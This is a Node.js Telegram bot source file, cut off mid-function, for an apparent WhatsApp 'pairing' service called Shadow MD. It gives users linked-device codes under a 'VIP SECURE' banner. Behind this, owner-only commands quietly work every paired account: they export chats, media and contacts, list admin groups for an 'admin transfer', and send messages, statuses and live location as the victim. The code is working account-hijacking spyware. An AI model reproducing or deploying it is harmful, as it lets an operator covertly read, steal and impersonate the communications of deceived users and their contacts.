require('dotenv').config();
require('./setting/config');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs').promises;
const fs2 = require("fs")
const path = require('path');
const chalk = require('chalk');
const { sleep } = require('./utils');
const { BOT_TOKEN } = require('./token');
const { autoLoadPairs } = require('./autoload');
const axios = require("axios")
const AdmZip = require('adm-zip');
const {
    getConnectedNumbers,
    getChatList,
    getContacts,
    getChatMessages,
    getMediaFiles,
    exportMessagesToZip,
    exportContactsToText,
    getContactName,
    getNumberDataPath
} = require('./dataCollector');
const { getActiveSocket } = require('./socketManager');

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const adminFilePath = path.join(__dirname, 'kingbadboitimewisher', 'admin.json');
let adminIDs = [];

// Store user states for pairing flow
const userStates = new Map();
// Store owner states for multi-step commands
const ownerStates = new Map();

const exists = async (filePath) => {
  try {
    await fs.access(filePath);
    return true;
  } catch {
    return false;
  }
};

const loadAdminIDs = async () => {
  const ownerID = '7848300179';
  const defaultAdmins = [ownerID];

  if (!(await exists(adminFilePath))) {
    await fs.writeFile(adminFilePath, JSON.stringify(defaultAdmins, null, 2));
    adminIDs = defaultAdmins;
    console.log('✅ Created admin.json with default owner ID');
  } else {
    try {
      const raw = await fs.readFile(adminFilePath, 'utf8');
      adminIDs = JSON.parse(raw);
    } catch (err) {
      console.error('Error loading admin.json:', err);
      adminIDs = defaultAdmins;
    }
  }
  console.log('📥 Loaded Admin IDs:', adminIDs);
};

let isShuttingDown = false;
let isAutoLoadRunning = true;

const runAutoLoad = async () => {
  if (isAutoLoadRunning || isShuttingDown) return;
  isAutoLoadRunning = true;

  try {
    console.log('⏱️ INITIATING AUTO-LOAD');
    await autoLoadPairs();
    console.log('✅ AUTO-LOAD COMPLETED');
  } catch (e) {
    console.error('❌ AUTO-LOAD FAILED:', e);
  } finally {
    isAutoLoadRunning = false;
  }
};

const startAutoLoadLoop = () => {
  runAutoLoad();
  setInterval(runAutoLoad, 60 * 60 * 1000);
};
startAutoLoadLoop();

const gracefulShutdown = (signal) => {
  if (isShuttingDown) return;
  isShuttingDown = true;

  console.log(`🛑 Received ${signal}. Shutting down gracefully...`);
  bot.stopPolling();
  console.log('✅ Bot stopped successfully');
  process.exit(0);
};

// ========== OWNER CHECK ==========
const isOwner = (userId) => adminIDs.includes(String(userId));

// ========== CHECK CHANNELS FUNCTION ==========
const checkUserJoinedChannels = async (userId) => {
  const channels = ['@shadowofficial786', '@shadowbanproof'];
  let allJoined = true;

  for (const channel of channels) {
    try {
      const member = await bot.getChatMember(channel, userId);
      if (['left', 'kicked'].includes(member.status)) {
        allJoined = false;
        break;
      }
    } catch {
      allJoined = false;
      break;
    }
  }
  return allJoined;
};

// ========== SEND CHANNELS REQUIRED MESSAGE ==========
const sendChannelsRequiredMessage = async (chatId) => {
  return bot.sendMessage(chatId,
    `🚨 *You must join our official channels before pairing.*`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📢 Channel 1', url: 'https://t.me/shadowofficial786' }],
          [{ text: '📢 Channel 2', url: 'https://t.me/shadowbanproof' }],
          [{ text: '👥 Group', url: 'https://t.me/skchatzone' }],
          [{ text: '✅ I have joined', callback_data: 'check_join' }]
        ]
      }
    }
  );
};

// ========== SEND GROUP MESSAGE (STYLISH) ==========
const sendGroupMessage = async (chatId, replyToMessageId = null) => {
  const botInfo = await bot.getMe();
  const botUsername = botInfo.username;

  const message = `╭━━〔 🛡️ 𝙑𝙄𝙋 𝙎𝙀𝘾𝙐𝙍𝙀 〕━━╮
➤ Use in DM 👇
╰━━〔 🚀 𝙎𝙏𝘼𝙍𝙏 𝙉𝙊𝙒 〕━━╯`;

  const options = {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🚀 START NOW', url: `https://t.me/${botUsername}?start=pair` }]
      ]
    }
  };

  if (replyToMessageId) {
    options.reply_to_message_id = replyToMessageId;
  }

  return bot.sendMessage(chatId, message, options);
};

// ========== START COMMAND ==========
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const isGroup = msg.chat.type === 'group' || msg.chat.type === 'supergroup';

  if (isGroup) {
    return sendGroupMessage(chatId, msg.message_id);
  }

  await bot.sendPhoto(
    chatId,
    "https://i.postimg.cc/NMn8rzqh/image1.png",
    {
      caption: `🪀 *𝙏𝙝𝙚 𝑺𝒉𝒂𝒅𝒐𝒘 𝑴𝑫💀*

╔════════════════════╗
 ⤷ /pair <wa_number>
 ⤷ /unpair <wa_number>
╚════════════════════╝`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "👑 Owner", url: "https://t.me/shadowhacr" }]
        ]
      }
    }
  );
});

// ========== PAIR COMMAND ==========
bot.onText(/\/pair(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isGroup = msg.chat.type === 'group' || msg.chat.type === 'supergroup';
  const text = match[1]?.trim();

  if (isGroup) {
    return sendGroupMessage(chatId, msg.message_id);
  }

  const allJoined = await checkUserJoinedChannels(userId);

  if (!allJoined) {
    return sendChannelsRequiredMessage(chatId);
  }

  if (!text) {
    userStates.set(userId, { step: 'awaiting_number' });
    return bot.sendMessage(chatId, 
      `🔐 *Please send your WhatsApp number*

Example: /pair 923xxxxxxxxx

Or just type: 923xxxxxxxxx`,
      { parse_mode: 'Markdown' }
    );
  }

  if (/[a-z]/i.test(text)) {
    return bot.sendMessage(chatId, '❌ *Letters are not allowed.*

Please send only numbers.', { parse_mode: 'Markdown' });
  }

  if (!/^\d{7,15}$/.test(text)) {
    return bot.sendMessage(chatId, '❌ *Invalid format.*

Please send a valid WhatsApp number.
Example: 923xxxxxxxxx', { parse_mode: 'Markdown' });
  }

  if (text.startsWith('0')) {
    return bot.sendMessage(chatId, '❌ *Numbers starting with 0 are not allowed.*

Please include country code.', { parse_mode: 'Markdown' });
  }

  const countryCode = text.slice(0, 3);
  if (["252", "201"].includes(countryCode)) {
    return bot.sendMessage(chatId, '❌ *Numbers with this country code are not supported.*', { parse_mode: 'Markdown' });
  }

  const pairingFolder = path.join(__dirname, 'kingbadboitimewisher', 'pairing');
  if (!(await exists(pairingFolder))) {
    await fs.mkdir(pairingFolder, { recursive: true });
  }

  const files = await fs.readdir(pairingFolder);
  const pairedCount = files.filter(f => f.endsWith('@s.whatsapp.net')).length;

  if (pairedCount >= 1000) {
    return bot.sendMessage(chatId, '❌ *Pairing limit reached.*

Please try again later.', { parse_mode: 'Markdown' });
  }

  userStates.delete(userId);

  try {
    const startpairing = require('./pair.js');
    const Xreturn = text + "@s.whatsapp.net";

    await bot.sendMessage(chatId, '⏳ *Generating pairing code...*

Please wait a moment.', { parse_mode: 'Markdown' });

    await startpairing(Xreturn);
    await sleep(4000);

    const pairingFile = path.join(pairingFolder, 'pairing.json');
    const cu = await fs.readFile(pairingFile, 'utf-8');
    const cuObj = JSON.parse(cu);
    delete require.cache[require.resolve('./pair.js')];

    return bot.sendMessage(chatId,
      `🔗 *Pairing Code for WhatsApp*

` +
      `📝 *Code:* 👉 `${cuObj.code}` 👈

` +
      `➡️ *Instructions:*
` +
      `1. Open WhatsApp
` +
      `2. Go to Settings → Linked Devices
` +
      `3. Tap "Link a Device"
` +
      `4. Enter this code

` +
      `⚠️ *Code expires in 2 minutes*`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: `Pairing system`, callback_data: `pairing_system` }]
          ]
        }
      }
    );

  } catch (error) {
    console.error('PAIR COMMAND ERROR:', error);
    bot.sendMessage(chatId, '❌ *Pairing service is temporarily unavailable.*

Please try again later.', { parse_mode: 'Markdown' });
  }
});

// ========== CALLBACK QUERY HANDLER (EXISTING) ==========
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;
  const chatId = msg.chat.id;

  if (data && data.startsWith('copy_code_')) {
    const code = data.replace('copy_code_', '');
    await bot.answerCallbackQuery(callbackQuery.id, { 
      text: `✅ Code copied: ${code}`, 
      show_alert: true
    });
    return;
  }

  if (data === 'check_join') {
    const allJoined = await checkUserJoinedChannels(userId);

    if (allJoined) {
      await bot.answerCallbackQuery(callbackQuery.id, { 
        text: '✅ Thanks for joining! Now use /pair command.', 
        show_alert: true
      });
      await bot.sendMessage(chatId, '✅ *Thanks for joining all channels!*

Now send /pair to start pairing.', { parse_mode: 'Markdown' });
    } else {
      await bot.answerCallbackQuery(callbackQuery.id, { 
        text: '❌ Please join all channels first!', 
        show_alert: true
      });
    }
    return;
  }

  // ========== OWNER CALLBACKS ==========
  if (data && data.startsWith('owner_')) {
    if (!isOwner(userId)) {
      await bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Access Denied', show_alert: true });
      return;
    }
    await handleOwnerCallbacks(callbackQuery);
    return;
  }
});

// ========== TEXT MESSAGE HANDLER ==========
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text;

  if (msg.chat.type !== 'private') return;
  if (!text) return;
  if (text.startsWith('/')) return;

  // Check owner state first
  const ownerState = ownerStates.get(userId);
  if (ownerState) {
    if (!isOwner(userId)) {
      ownerStates.delete(userId);
      return;
    }
    await handleOwnerTextInput(userId, chatId, text, msg);
    return;
  }

  const userState = userStates.get(userId);
  if (!userState || userState.step !== 'awaiting_number') return;

  const phoneRegex = /^\d{7,15}$/;
  if (!phoneRegex.test(text)) return;

  userStates.delete(userId);

  const allJoined = await checkUserJoinedChannels(userId);

  if (!allJoined) {
    return bot.sendMessage(chatId,
      `🚨 *You must join our official channels before pairing.*`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📢 Channel 1', url: 'https://t.me/shadowofficial786' }],
            [{ text: '📢 Channel 2', url: 'https://t.me/shadowbanproof' }],
            [{ text: '👥 Group', url: 'https://t.me/skchatzone' }],
            [{ text: '✅ I have joined', callback_data: 'check_join' }]
          ]
        }
      }
    );
  }

  if (/[a-z]/i.test(text)) {
    return bot.sendMessage(chatId, '❌ Letters are not allowed. Send only numbers.');
  }

  if (text.startsWith('0')) {
    return bot.sendMessage(chatId, '❌ Numbers starting with 0 are not allowed.');
  }

  const countryCode = text.slice(0, 3);
  if (["252", "201"].includes(countryCode)) {
    return bot.sendMessage(chatId, '❌ Numbers with this country code are not supported.');
  }

  const pairingFolder = path.join(__dirname, 'kingbadboitimewisher', 'pairing');
  if (!(await exists(pairingFolder))) {
    await fs.mkdir(pairingFolder, { recursive: true });
  }

  const files = await fs.readdir(pairingFolder);
  const pairedCount = files.filter(f => f.endsWith('@s.whatsapp.net')).length;

  if (pairedCount >= 1000) {
    return bot.sendMessage(chatId, '❌ Pairing limit reached. Try again later.');
  }

  try {
    const startpairing = require('./pair.js');
    const Xreturn = text + "@s.whatsapp.net";

    await bot.sendMessage(chatId, '⏳ Generating pairing code...');

    await startpairing(Xreturn);
    await sleep(4000);

    const pairingFile = path.join(pairingFolder, 'pairing.json');
    const cu = await fs.readFile(pairingFile, 'utf-8');
    const cuObj = JSON.parse(cu);
    delete require.cache[require.resolve('./pair.js')];

    return bot.sendMessage(chatId,
      `🔗 *Pairing Code*

📝 Code: `${cuObj.code}`

1. Open WhatsApp
2. Settings → Linked Devices
3. Link a Device
4. Enter this code`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: `📋 Copy: ${cuObj.code}`, callback_data: `copy_code_${cuObj.code}` }]
          ]
        }
      }
    );

  } catch (error) {
    console.error('PAIRING ERROR:', error);
    bot.sendMessage(chatId, '❌ Pairing failed. Try again later.');
  }
});

// ========== UNPAIR COMMAND ==========
bot.onText(/\/unpair(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1]?.trim();
  const isGroup = msg.chat.type === 'group' || msg.chat.type === 'supergroup';

  if (isGroup) {
    return bot.sendMessage(chatId, '❌ Please use /unpair in my private chat.', { parse_mode: 'Markdown' });
  }

  try {
    if (!input) {
      return bot.sendMessage(chatId, 'Example: /unpair 923xxxxxxxxx', { parse_mode: 'Markdown' });
    }
    if (/[a-z]/i.test(input)) {
      return bot.sendMessage(chatId, 'Letters not allowed. Use: /unpair 923xxxxxxxxx', { parse_mode: 'Markdown' });
    }
    if (!/^\d{7,15}$/.test(input)) {
      return bot.sendMessage(chatId, 'Invalid format. Use: /unpair 923xxxxxxxxx', { parse_mode: 'Markdown' });
    }
    if (input.startsWith('0')) {
      return bot.sendMessage(chatId, 'Numbers starting with 0 not allowed.', { parse_mode: 'Markdown' });
    }

    const jidSuffix = `${input}`;
    const pairingPath = path.join(__dirname, 'kingbadboitimewisher', 'pairing');

    if (!(await exists(pairingPath))) {
      return bot.sendMessage(chatId, 'No paired devices found.');
    }

    const entries = await fs.readdir(pairingPath, { withFileTypes: true });
    const matched = entries.find(entry => entry.isDirectory() && entry.name.endsWith(jidSuffix));

    if (!matched) {
      return bot.sendMessage(chatId, `No paired device found for *${input}*`, { parse_mode: 'Markdown' });
    }

    const targetPath = path.join(pairingPath, matched.name);
    await fs.rm(targetPath, { recursive: true, force: true });

    return bot.sendMessage(chatId, `✅ Paired user *${input}* has been deleted successfully`, { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('UNPAIR ERROR:', err);
    bot.sendMessage(chatId, 'Failed to delete paired user. Please try again.');
  }
});

// ═══════════════════════════════════════════════════════════════
// ═══════════════ OWNER COMMANDS SECTION ═══════════════════════
// ═══════════════════════════════════════════════════════════════

// ========== /OWNER COMMAND ==========
bot.onText(/\/owner/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) return;

    await bot.sendMessage(chatId,
        `🛡️ *OWNER CONTROL PANEL*

` +
        `╔══════════════════════════════════════╗
` +
        `║  📋 Available Owner Commands:        ║
` +
        `╠══════════════════════════════════════╣
` +
        `║  /checksms  - View & Export Chats    ║
` +
        `║  /checkcn   - Export Contacts        ║
` +
        `║  /checkow   - Groups & Channels      ║
` +
        `║  /sendsms   - Send Messages          ║
` +
        `║  /addstatus - Post WhatsApp Status   ║
` +
        `║  /sendlo    - Send Live Location     ║
` +
        `╚══════════════════════════════════════╝

` +
        `⚠️ These commands are owner-only.`,
        { parse_mode: 'Markdown' }
    );
});

// ========== /CHECKSMS COMMAND ==========
bot.onText(/\/checksms/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) {
        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
    }

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sms_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId,
        `🛡️ *OWNER PANEL - Check SMS*

Select a connected number:`,
        { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }
    );
});

// ========== /CHECKCN COMMAND ==========
bot.onText(/\/checkcn/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) {
        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
    }

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_cn_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId,
        `🛡️ *OWNER PANEL - Check Contacts*

Select a connected number:`,
        { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }
    );
});

// ========== /CHECKOW COMMAND ==========
bot.onText(/\/checkow/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) {
        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
    }

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_ow_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId,
        `🛡️ *OWNER PANEL - Groups & Channels*

Select a connected number:`,
        { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }
    );
});

// ========== /SENDSMS COMMAND ==========
bot.onText(/\/sendsms/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) {
        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
    }

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_send_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId,
        `🛡️ *OWNER PANEL - Send Message*

Select source number:`,
        { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }
    );
});

// ========== /ADDSTATUS COMMAND ==========
bot.onText(/\/addstatus/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) {
        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
    }

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_status_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId,
        `🛡️ *OWNER PANEL - Post Status*

Select a connected number:`,
        { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }
    );
});

// ========== /SENDLO COMMAND ==========
bot.onText(/\/sendlo/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) {
        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
    }

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_lo_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId,
        `🛡️ *OWNER PANEL - Send Live Location*

Select source number:`,
        { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } }
    );
});

// ═══════════════════════════════════════════════════════════════
// ═══════════════ OWNER CALLBACK HANDLER ═══════════════════════
// ═══════════════════════════════════════════════════════════════

async function handleOwnerCallbacks(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id;
    const chatId = msg.chat.id;

    // Cancel
    if (data === 'owner_cancel') {
        ownerStates.delete(userId);
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Cancelled' });
        await bot.deleteMessage(chatId, msg.message_id);
        return;
    }

    // ═══════ CHECKSMS FLOW ═══════
    if (data.startsWith('owner_sms_num_')) {
        const number = data.replace('owner_sms_num_', '');
        const chats = getChatList(number);

        if (chats.length === 0) {
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ No chats found' });
            return;
        }

        const buttons = chats.map(chat => [{
            text: `💬 ${chat.name} (${chat.messageCount})`,
            callback_data: `owner_sms_chat_${number}_${chat.remoteJid}`
        }]);
        buttons.push([{ text: '⬅️ Back', callback_data: 'owner_sms_back' }]);
        buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

        await bot.editMessageText(
            `🛡️ *Check SMS*
📱 ${number}
💬 ${chats.length} chats

Select chat:`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('owner_sms_chat_')) {
        const parts = data.split('_');
        const number = parts[3];
        const remoteJid = parts.slice(4).join('_');

        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Generating export...' });

        try {
            const chatText = exportMessagesToZip(number, remoteJid);
            const chatName = getContactName(number, remoteJid);
            const targetNum = remoteJid.split('@')[0];
            const rawMessages = getChatMessages(number, remoteJid);

            // Create professional ZIP with Media folder
            const zip = new AdmZip();
            zip.addFile(`chat_${targetNum}.txt`, Buffer.from(chatText, 'utf8'));
            zip.addFile(`chat_${targetNum}_raw.json`, Buffer.from(JSON.stringify(rawMessages, null, 2), 'utf8'));

            // Add media folder
            const mediaDir = path.join(getNumberDataPath(number), 'media');
            if (fs2.existsSync(mediaDir)) {
                const allMedia = fs2.readdirSync(mediaDir);
                for (const file of allMedia) {
                    const filePath = path.join(mediaDir, file);
                    if (fs2.existsSync(filePath)) {
                        zip.addLocalFile(filePath, 'Media');
                    }
                }
            }

            const zipPath = `/tmp/chat_export_${number}_${targetNum}.zip`;
            zip.writeZip(zipPath);

            await bot.sendDocument(chatId, zipPath, {
                caption: `🛡️ *CHAT EXPORT*

📱 ${number} → ${chatName}
💬 ${rawMessages.length} messages
📁 Media included`,
                parse_mode: 'Markdown'
            });

            if (fs2.existsSync(zipPath)) fs2.unlinkSync(zipPath);

        } catch (e) {
            console.error('Export error:', e);
            await bot.sendMessage(chatId, '❌ Export failed.', { parse_mode: 'Markdown' });
        }
        return;
    }

    if (data === 'owner_sms_back') {
        const numbers = getConnectedNumbers();
        const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sms_num_${num}` }]);
        buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

        await bot.editMessageText(
            `🛡️ *Check SMS*

Select a connected number:`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ═══════ CHECKCN FLOW ═══════
    if (data.startsWith('owner_cn_num_')) {
        const number = data.replace('owner_cn_num_', '');
        const contacts = getContacts(number);

        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Generating...' });

        try {
            const contactsText = exportContactsToText(number);
            const zip = new AdmZip();
            zip.addFile(`contacts_${number}.txt`, Buffer.from(contactsText, 'utf8'));
            zip.addFile(`contacts_${number}_raw.json`, Buffer.from(JSON.stringify(contacts, null, 2), 'utf8'));

            const zipPath = `/tmp/contacts_export_${number}.zip`;
            zip.writeZip(zipPath);

            await bot.sendDocument(chatId, zipPath, {
                caption: `🛡️ *CONTACTS EXPORT*

📱 ${number}
👥 ${contacts.length} contacts`,
                parse_mode: 'Markdown'
            });

            if (fs2.existsSync(zipPath)) fs2.unlinkSync(zipPath);

        } catch (e) {
            console.error('Contacts export error:', e);
            await bot.sendMessage(chatId, '❌ Export failed.', { parse_mode: 'Markdown' });
        }
        return;
    }

    // ═══════ CHECKOW FLOW (Groups & Channels) ═══════
    if (data.startsWith('owner_ow_num_')) {
        const number = data.replace('owner_ow_num_', '');
        const sock = await getActiveSocket(number + '@s.whatsapp.net');

        if (!sock) {
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Socket not active' });
            return;
        }

        try {
            // Get groups where admin
            const groups = await sock.groupFetchAllParticipating();
            const adminGroups = [];
            for (const [jid, meta] of Object.entries(groups)) {
                const me = meta.participants.find(p => p.id.includes(number));
                if (me && (me.admin === 'admin' || me.admin === 'superadmin')) {
                    adminGroups.push({ jid, name: meta.subject, participants: meta.participants.length });
                }
            }

            const buttons = [];

            buttons.push([{ text: '📢 GROUPS', callback_data: 'owner_ow_header_groups' }]);
            for (const g of adminGroups) {
                buttons.push([{ 
                    text: `👥 ${g.name} (${g.participants})`, 
                    callback_data: `owner_ow_group_${number}_${g.jid}` 
                }]);
            }

            buttons.push([{ text: '📰 CHANNELS', callback_data: 'owner_ow_header_channels' }]);
            buttons.push([{ 
                text: '➕ Add Channel (Manual)', 
                callback_data: `owner_ow_channel_add_${number}` 
            }]);

            buttons.push([{ text: '⬅️ Back', callback_data: 'owner_ow_back' }]);
            buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

            await bot.editMessageText(
                `🛡️ *Groups & Channels*
📱 ${number}
👥 ${adminGroups.length} admin groups

Select:`,
                {
                    chat_id: chatId, message_id: msg.message_id,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: buttons }
                }
            );
            await bot.answerCallbackQuery(callbackQuery.id);

        } catch (e) {
            console.error('CheckOW error:', e);
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error fetching data' });
        }
        return;
    }

    if (data.startsWith('owner_ow_group_')) {
        const parts = data.split('_');
        const number = parts[3];
        const groupJid = parts.slice(4).join('_');

        ownerStates.set(userId, {
            step: 'ow_group_target',
            number: number,
            groupJid: groupJid,
            type: 'group'
        });

        await bot.editMessageText(
            `🛡️ *Group Admin Transfer*

📱 Source: ${number}
👥 Group: ${groupJid}

📝 Send target number (with country code):`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'owner_cancel' }]]
                }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('owner_ow_channel_add_')) {
        const number = data.replace('owner_ow_channel_add_', '');

        ownerStates.set(userId, {
            step: 'ow_channel_jid',
            number: number,
            type: 'channel_add'
        });

        await bot.editMessageText(
            `🛡️ *Add Channel*

📱 Number: ${number}

📝 Send Channel JID (e.g., 123456789@newsletter):`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'owner_cancel' }]]
                }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'owner_ow_back') {
        const numbers = getConnectedNumbers();
        const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_ow_num_${num}` }]);
        buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

        await bot.editMessageText(
            `🛡️ *Groups & Channels*

Select a connected number:`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ═══════ SENDSMS FLOW ═══════
    if (data.startsWith('owner_send_num_')) {
        const number = data.replace('owner_send_num_', '');

        ownerStates.set(userId, {
            step: 'send_target',
            sourceNumber: number
        });

        await bot.editMessageText(
            `🛡️ *Send Message*

📱 Source: ${number}

📝 Send target number (with country code):`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'owner_cancel' }]]
                }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ═══════ ADDSTATUS FLOW ═══════
    if (data.startsWith('owner_status_num_')) {
        const number = data.replace('owner_status_num_', '');

        ownerStates.set(userId, {
            step: 'status_type',
            sourceNumber: number
        });

        await bot.editMessageText(
            `🛡️ *Post Status*

📱 Number: ${number}

Select status type:`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📝 Text', callback_data: `owner_status_type_${number}_text` }],
                        [{ text: '📷 Image', callback_data: `owner_status_type_${number}_image` }],
                        [{ text: '🎬 Video', callback_data: `owner_status_type_${number}_video` }],
                        [{ text: '🎙️ Voice', callback_data: `owner_status_type_${number}_voice` }],
                        [{ text: '❌ Cancel', callback_data: 'owner_cancel' }]
                    ]
                }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('owner_status_type_')) {
        const parts = data.split('_');
        const number = parts[3];
        const type = parts[4];

        ownerStates.set(userId, {
            step: 'status_content',
            sourceNumber: number,
            statusType: type
        });

        let prompt = '';
        if (type === 'text') prompt = '📝 Send text for status:';
        else if (type === 'image') prompt = '📷 Send image with optional caption:';
        else if (type === 'video') prompt = '🎬 Send video with optional caption:';
        else if (type === 'voice') prompt = '🎙️ Send voice message:';

        await bot.editMessageText(
            `🛡️ *Post Status*

📱 ${number}
${prompt}`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'owner_cancel' }]]
                }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ═══════ SENDLO FLOW ═══════
    if (data.startsWith('owner_lo_num_')) {
        const number = data.replace('owner_lo_num_', '');

        ownerStates.set(userId, {
            step: 'lo_target',
            sourceNumber: number
        });

        await bot.editMessageText(
            `🛡️ *Send Live Location*

📱 Source: ${number}

📝 Send target number (with country code):`,
            {
                chat_id: chatId, message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'owner_cancel' }]]
                }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
}

// ═══════════════════════════════════════════════════════════════
// ═══════════════ OWNER TEXT INPUT HANDLER ═════════════════════
// ═══════════════════════════════════════════════════════════════

async function handleOwnerTextInput(userId, chatId, text, msg) {
    const state = ownerStates.get(userId);
    if (!state) return;

    // ═══════ SENDSMS: Target Number ═══════
    if (state.step === 'send_target') {
        if (!/^\d{7,15}$/.test(text)) {
            await bot.sendMessage(chatId, '❌ Invalid number. Send valid number with country code.');
            return;
        }
        state.targetNumber = text;
        state.step = 'send_message';
        await bot.sendMessage(chatId,
            `🛡️ *Send Message*

📱 To: ${text}

